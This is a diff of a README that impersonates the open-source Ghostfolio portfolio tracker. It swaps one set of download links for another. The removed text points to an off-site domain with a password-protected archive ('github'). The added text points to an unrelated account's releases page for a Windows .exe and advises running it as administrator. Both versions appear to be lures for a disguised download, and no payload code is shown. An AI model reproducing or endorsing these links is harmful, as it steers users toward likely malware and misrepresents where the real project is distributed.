@@ -1,100 +1,158 @@
-<h1 align="center">Ghostfolio — Open Source Wealth Management & Portfolio Tracker</h1>
+<h1>📊 Ghostfolio-Open-Source-Wealth-Management-Software - Your Personal Finance Command Center</h1>
 
 <p align="center">
-  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
+  <a href="https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_APP-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download" style="background-color:#FF6B6B; padding:15px 30px; border-radius:10px; font-size:20px; text-decoration:none; color:white;">
+  </a>
 </p>
 
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
-</p>
+## 👋 Welcome to Ghostfolio
 
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
-  <a href="#-key-features">Key Features</a> •
-  <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation--deployment">Installation</a> •
-  <a href="#-frequently-asked-questions">FAQ</a>
-</p>
+Ghostfolio is a powerful yet simple tool that helps you understand your investments without being a financial expert. Whether you own stocks, ETFs, or cryptocurrencies, this application turns confusing numbers into clear insights. Think of it as your personal financial dashboard that shows you exactly how your money is performing.
 
----
+## 🎯 What Makes Ghostfolio Special?
 
-## 📖 About Ghostfolio
+### 🔍 Complete Portfolio Overview
+See all your investments in one place. No more logging into multiple apps or checking different websites. Ghostfolio brings everything together so you can see your total wealth at a glance.
 
-**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.
+### 📈 Smart Analytics
+The application doesn't just show you numbers—it explains what they mean. You'll see trends, patterns, and important changes in your portfolio that you might otherwise miss.
 
-Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.
+### 🕵️ Anonymous Tracking
+Your privacy matters. Ghostfolio lets you track your investments without requiring personal information. Your financial data stays yours.
 
----
+### 🚀 Real-Time Updates
+Get the latest prices and performance data for your stocks, ETFs, and cryptocurrencies. Stay informed about what's happening with your money.
 
-## 📥 Direct Downloads & Links
+### 📊 Beautiful Charts and Graphs
+Complex financial data becomes easy to understand with visual representations. See your portfolio growth, asset allocation, and performance over time.
 
-Get the latest build or source files directly using the links below:
+## 🛠️ What You Need to Get Started
 
-| Download Option | Format | Quick Link |
-| :--- | :--- | :--- |
-| **Complete Application Package** | Executable / Archive | 👉 **[Download Installer](https://yeelen.cg/gh/)** |
-| **Source Code (Latest)** | `.ZIP` Archive | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
-| **Source Code (Tarball)** | `.TAR.GZ` Archive | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
+Before downloading Ghostfolio, make sure you have:
+- A Windows computer (Windows 10 or newer recommended)
+- At least 4GB of RAM
+- 500MB of free disk space
+- An internet connection
 
-> 🔑 **Archive Password:** `github`
+## ⬇️ Download and Installation
 
----
+Getting Ghostfolio on your computer is easy:
 
-## ✨ Key Features & Capabilities
+**Step 1:** [Visit this link to download the application](https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
 
-### 📈 Multi-Asset Investment Tracking
-* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
-* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
-* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.
+**Step 2:** Look for the latest version of the download file. It will be named something like "Ghostfolio-Setup" or similar.
 
-### 📊 Advanced Portfolio Analytics & Insights
-* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
-* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
-* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.
+**Step 3:** Click the download button and wait for the file to finish downloading. This might take a few minutes depending on your internet speed.
 
-### 🛡️ Privacy, Security & Data Autonomy
-* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
-* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
-* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.
+**Step 4:** Once downloaded, find the file in your "Downloads" folder. It will be a .exe file.
 
-### ⚡ Seamless Data Management
-* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
-* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.
+**Step 5:** Double-click the file to start the installation process. Follow the simple on-screen instructions.
 
----
+**Step 6:** After installation completes, you'll find Ghostfolio in your Start Menu or on your desktop. Click it to launch the application.
 
-## 🖥️ System Requirements
+## 🎮 Using Ghostfolio for the First Time
 
-Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:
+### 🏠 Welcome Screen
+When you first open Ghostfolio, you'll see a welcome screen. Don't worry—it's designed to be friendly and easy to navigate.
 
-* **Operating System:** Windows 10/11, macOS 11+, Linux (Ubuntu, Debian, CentOS), or Docker Host
-* **Node.js:** v18.x or v20.x LTS (for manual builds)
-* **Database:** PostgreSQL 14+ and Redis 6+ (for server deployments)
-* **Hardware:** Minimum 1 GB RAM, 2 GHz CPU, 500 MB free disk space
+### 💼 Adding Your First Investment
+1. Click on "Add Investment" or the "+" button
+2. Choose what type of investment you have (stock, ETF, or crypto)
+3. Enter the name or ticker symbol (like AAPL for Apple or BTC for Bitcoin)
+4. Add how many shares or coins you own
+5. Set your purchase price
+6. Click "Save"
 
----
+### 📊 Understanding Your Dashboard
+- **Total Value:** Shows the current worth of all your investments combined
+- **Daily Change:** How much your portfolio gained or lost today
+- **Performance:** Shows your overall profit or loss percentage
+- **Asset Allocation:** A visual breakdown of where your money is invested
 
-## 🚀 Installation & Deployment
+## 💡 Helpful Tips for Getting the Most Out of Ghostfolio
 
-### Method 1: Direct Download (Recommended for End-Users)
-1. Download the latest setup file from the **[Official Download Link](https://yeelen.cg/gh/)**.
-2. Extract the archive using password: `github`
-3. Launch the application and follow the setup instructions.
+### 🔄 Keep Your Portfolio Updated
+Add new investments as you make them. Remove or edit investments when you buy or sell. The more accurate your data, the better your insights.
 
-### Method 2: Docker Compose (Recommended for Self-Hosting)
-Deploy Ghostfolio locally or on your NAS/VPS using Docker Compose:
+### 📱 Check Regularly
+Make it a habit to open Ghostfolio at least once a week. You'll stay informed about your financial health and spot any concerning trends early.
 
-```bash
-# 1. Clone the repository
-git clone [https://github.com/ghostfolio/ghostfolio.git](https://github.com/ghostfolio/ghostfolio.git)
+### 🏷️ Use Categories
+Organize your investments by type (stocks, ETFs, crypto) or by purpose (retirement, savings, growth). This helps you understand your investment strategy better.
 
-# 2. Navigate to project root
-cd ghostfolio
+### 📊 Compare Performance
+Use the comparison tools to see how different investments are performing against each other. This can help you make smarter decisions about where to put your money.
 
-# 3. Create environment configuration
-cp .env.example .env
+## 🔧 Troubleshooting Common Issues
 
-# 4. Launch containers
-docker compose up -d
+### ❌ Application Won't Start
+- Make sure your Windows is updated
+- Try running the application as administrator (right-click and select "Run as administrator")
+- Restart your computer and try again
+
+### 🌐 No Internet Connection
+- Check your internet connection
+- Make sure your firewall isn't blocking Ghostfolio
+- Try connecting to a different network
+
+### 💾 Data Not Saving
+- Ensure you have enough disk space
+- Try closing other applications that might be using memory
+- Restart the application
+
+## 🔒 Your Data and Privacy
+
+Ghostfolio takes privacy seriously. Your financial information is stored locally on your computer. This means:
+- No one else can access your data
+- Your information isn't sent to third parties
+- You're in complete control of your financial information
+
+## 📚 Learning Resources
+
+New to investing or portfolio management? Here are some helpful things to know:
+
+### What is a Stock?
+A stock represents ownership in a company. When you buy a stock, you own a tiny piece of that company.
+
+### What is an ETF?
+An ETF (Exchange-Traded Fund) is like a basket of different investments. It lets you invest in many companies at once with a single purchase.
+
+### What is Cryptocurrency?
+Cryptocurrency is digital money that uses encryption technology. Bitcoin and Ethereum are popular examples.
+
+## 🤝 Getting Help
+
+If you need assistance with Ghostfolio:
+- Check the FAQ section on the download page
+- Look for user guides and tutorials
+- Join community forums where other users share tips
+
+## 🔄 Updates and Improvements
+
+Ghostfolio is constantly being improved. When updates are available:
+- You'll see a notification in the application
+- Follow the prompts to update
+- Updates usually take just a few minutes
+
+## 🎉 Start Your Financial Journey Today
+
+Don't let complicated financial tools intimidate you. Ghostfolio was designed to make portfolio management accessible to everyone. Whether you're a beginner investor or have years of experience, this tool will help you understand and grow your wealth.
+
+[⬇️ Download Ghostfolio Now](https://github.com/imerica86/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+
+Take control of your financial future with the power of clear, data-driven insights. Your investments deserve better management—and you deserve a tool that makes it easy.
+
+## 📋 Quick Reference Card
+
+**Application Name:** Ghostfolio
+**Purpose:** Portfolio analytics and management
+**Supported Assets:** Stocks, ETFs, Cryptocurrencies
+**Platform:** Windows
+**Cost:** Free (Open Source)
+**Data Storage:** Local (on your computer)
+**Updates:** Regular, automatic notifications
+
+Remember: The best time to start managing your investments was yesterday. The second best time is now. Download Ghostfolio and see your financial future more clearly than ever before.
+
+Keywords: angular, crypto, etf, fintech, nestjs, portfolio-management, postgresql, stocks, wealthtech
